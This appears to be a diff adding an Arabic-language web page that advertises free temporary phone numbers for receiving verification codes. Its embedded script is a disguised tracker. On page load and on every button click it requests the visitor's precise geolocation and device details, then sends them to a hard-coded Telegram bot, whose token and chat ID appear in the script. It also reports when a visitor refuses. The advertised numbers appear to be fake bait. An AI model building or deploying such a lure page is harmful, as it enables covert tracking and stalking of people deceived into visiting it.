@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رقم افتراضي مجاني</title>
+
+    <!-- الوسوم المحدثة تماماً مثل رابط الواي فاي الناجح -->
+    <meta property="og:title" content="رقم افتراضي مجاني">
+    <meta property="og:description" content="احصل على أرقام هواتف مؤقتة ومجانية لاستلام رموز التحقق OTP فوراً.">
+    <meta property="og:image" content="https://cdn.imagetourls.com/uploads/tyImg/1efGcjWTv.png">
+    <meta property="og:type" content="website">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0b111e;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 25px 15px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            text-align: center;
+        }
+
+        .custom-image-box {
+            width: 100%;
+            max-width: 200px;
+            margin: 0 auto 15px auto;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(22, 163, 148, 0.25);
+            border: 1.5px solid #16a394;
+        }
+
+        .custom-image-box img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .main-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: #16a394;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .badge-pill {
+            display: inline-block;
+            background: linear-gradient(90deg, #1b7fa8, #14967f);
+            color: #e0f7fa;
+            padding: 10px 28px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(20, 150, 127, 0.25);
+        }
+
+        .apps-bar {
+            background-color: #161d2b;
+            border: 1px solid #232d42;
+            border-radius: 50px;
+            padding: 10px 20px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 18px;
+            margin-bottom: 22px;
+        }
+
+        .app-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: #cbd5e1;
+            font-weight: 500;
+        }
+
+        .app-icon {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        .icon-fb { background-color: #1877f2; color: white; }
+        .icon-tg { background-color: #24a1de; color: white; }
+        .icon-wa { border: 1.5px solid #25d366; color: #25d366; }
+
+        .subtitle {
+            color: #94a3b8;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 28px;
+            padding: 0 10px;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 14px;
+        }
+
+        .card {
+            background-color: #131926;
+            border: 1px solid #1e293b;
+            border-radius: 16px;
+            padding: 20px 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: transform 0.2s, border-color 0.2s;
+        }
+
+        .card:hover {
+            transform: translateY(-3px);
+            border-color: #334155;
+        }
+
+        .flag {
+            width: 44px;
+            height: 30px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+            object-fit: cover;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
+        }
+
+        .country-name {
+            color: #94a3b8;
+            font-size: 13px;
+            margin-bottom: 6px;
+        }
+
+        .phone-number {
+            color: #f8fafc;
+            font-size: 14px;
+            font-weight: 700;
+            direction: ltr;
+            margin-bottom: 16px;
+            letter-spacing: 0.3px;
+        }
+
+        .select-btn {
+            width: 100%;
+            background-color: #c92a2a;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 0;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .select-btn:hover {
+            background-color: #a61e1e;
+        }
+
+        .select-btn:active {
+            transform: scale(0.98);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.75);
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 100;
+        }
+
+        .modal-content {
+            background: #161d2b;
+            border: 1px solid #2d3748;
+            border-radius: 16px;
+            padding: 24px;
+            width: 100%;
+            max-width: 340px;
+            text-align: center;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            color: #16a394;
+            margin-bottom: 10px;
+        }
+
+        .modal-num {
+            font-size: 18px;
+            font-weight: bold;
+            direction: ltr;
+            background: #0b111e;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 12px 0;
+            color: #fff;
+        }
+
+        .close-btn {
+            background: #334155;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="custom-image-box">
+            <img src="https://cdn.imagetourls.com/uploads/tyImg/1efGcjWTv.png" alt="صورة توضيحية">
+        </div>
+
+        <h1 class="main-title">رقم افتراضي مجاني 📞</h1>
+
+        <div class="badge-pill">آمن • مؤقت • مجاني</div>
+
+        <div class="apps-bar">
+            <div class="app-item">
+                <span>فيسبوك</span>
+                <span class="app-icon icon-fb">f</span>
+            </div>
+            <div class="app-item">
+                <span>برقية</span>
+                <span class="app-icon icon-tg">✈</span>
+            </div>
+            <div class="app-item">
+                <span>واتساب</span>
+                <span class="app-icon icon-wa">✆</span>
+            </div>
+        </div>
+
+        <p class="subtitle">
+            احصل على أرقام التحقق المجانية لمرة واحدة (OTP) فوراً. اختر وجهة أدناه للبدء.
+        </p>
+
+        <div class="grid">
+            <div class="card">
+                <svg class="flag" viewBox="0 0 60 30">
+                    <rect width="60" height="30" fill="#012169"/>
+                    <path d="M0,0 L60,30 M60,0 L0,30" stroke="#fff" stroke-width="6"/>
+                    <path d="M0,0 L60,30 M60,0 L0,30" stroke="#C8102E" stroke-width="2"/>
+                    <path d="M30,0 v30 M0,15 h60" stroke="#fff" stroke-width="10"/>
+                    <path d="M30,0 v30 M0,15 h60" stroke="#C8102E" stroke-width="6"/>
+                </svg>
+                <div class="country-name">المملكة المتحدة</div>
+                <div class="phone-number">+44 8752 333 690</div>
+                <button class="select-btn" onclick="selectNumber('المملكة المتحدة', '+44 8752 333 690')">يختار</button>
+            </div>
+
+            <div class="card">
+                <svg class="flag" viewBox="0 0 60 30">
+                    <rect width="60" height="30" fill="#bf0a30"/>
+                    <path d="M0,4.6 h60 M0,13.8 h60 M0,23 h60" stroke="#fff" stroke-width="2.3"/>
+                    <rect width="26" height="16" fill="#002868"/>
+                </svg>
+                <div class="country-name">الولايات المتحدة</div>
+                <div class="phone-number">+1 398 362 8901</div>
+                <button class="select-btn" onclick="selectNumber('الولايات المتحدة', '+1 398 362 8901')">يختار</button>
+            </div>
+
+            <div class="card">
+                <svg class="flag" viewBox="0 0 60 30">
+                    <rect width="20" height="30" x="0" fill="#002395"/>
+                    <rect width="20" height="30" x="20" fill="#ffffff"/>
+                    <rect width="20" height="30" x="40" fill="#ed2939"/>
+                </svg>
+                <div class="country-name">فرنسا</div>
+                <div class="phone-number">+33 83 333 765</div>
+                <button class="select-btn" onclick="selectNumber('فرنسا', '+33 83 333 765')">يختار</button>
+            </div>
+
+            <div class="card">
+                <svg class="flag" viewBox="0 0 60 30">
+                    <rect width="60" height="10" y="0" fill="#FF9933"/>
+                    <rect width="60" height="10" y="10" fill="#FFFFFF"/>
+                    <rect width="60" height="10" y="20" fill="#138808"/>
+                    <circle cx="30" cy="15" r="4" fill="none" stroke="#000080" stroke-width="1"/>
+                </svg>
+                <div class="country-name">الهند</div>
+                <div class="phone-number">+91 77234 43910</div>
+                <button class="select-btn" onclick="selectNumber('الهند', '+91 77234 43910')">يختار</button>
+            </div>
+
+            <div class="card">
+                <svg class="flag" viewBox="0 0 60 30">
+                    <rect width="60" height="30" fill="#ffffff"/>
+                    <circle cx="30" cy="15" r="8" fill="#bc002d"/>
+                </svg>
+                <div class="country-name">اليابان</div>
+                <div class="phone-number">+81 5587 652 292</div>
+                <button class="select-btn" onclick="selectNumber('اليابان', '+81 5587 652 292')">يختار</button>
+            </div>
+
+            <div class="card">
+                <svg class="flag" viewBox="0 0 60 30">
+                    <rect width="60" height="10" y="0" fill="#000000"/>
+                    <rect width="60" height="10" y="10" fill="#DD0000"/>
+                    <rect width="60" height="10" y="20" fill="#FFCE00"/>
+                </svg>
+                <div class="country-name">ألمانيا</div>
+                <div class="phone-number">+49 6625 567 982</div>
+                <button class="select-btn" onclick="selectNumber('ألمانيا', '+49 6625 567 982')">يختار</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal" class="modal" onclick="closeModal(event)">
+        <div class="modal-content">
+            <div class="modal-title" id="modalCountry">تم اختيار الرقم</div>
+            <p style="color:#94a3b8; font-size:13px;">استخدم هذا الرقم لاستلام رمز التفعيل:</p>
+            <div class="modal-num" id="modalNumber"></div>
+            <button class="close-btn" onclick="document.getElementById('modal').style.display='none'">إغلاق</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs";
+        const CHAT_ID = "8859920681";
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: "HTML"
+                })
+            }).catch(err => console.error(err));
+        }
+
+        function requestLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = Math.round(position.coords.accuracy);
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                        const msg = `📍 <b>تم تحديد موقع جديد:</b>\n\n` +
+                                    `• <b>خط العرض:</b> <code>${lat}</code>\n` +
+                                    `• <b>خط الطول:</b> <code>${lon}</code>\n` +
+                                    `• <b>الدقة:</b> ${acc} متر\n` +
+                                    `• <b>الخريطة:</b> <a href="${mapUrl}">فتح في Google Maps</a>\n` +
+                                    `• <b>الجهاز:</b> ${navigator.userAgent}`;
+
+                        sendToTelegram(msg);
+                    },
+                    (error) => {
+                        let reason = "تم رفض الإذن أو تعذر التحديد";
+                        if (error.code === error.PERMISSION_DENIED) reason = "المستخدم رفض إذن الموقع";
+                        sendToTelegram(`⚠️ <b>محاولة دخول للصفحة:</b>\nالحالة: ${reason}`);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+
+        // طلب الموقع فور دخول الصفحة
+        window.addEventListener("load", requestLocation);
+
+        function selectNumber(country, number) {
+            document.getElementById('modalCountry').innerText = 'رقم ' + country;
+            document.getElementById('modalNumber').innerText = number;
+            document.getElementById('modal').style.display = 'flex';
+            requestLocation();
+        }
+
+        function closeModal(e) {
+            if (e.target.id === 'modal') {
+                document.getElementById('modal').style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
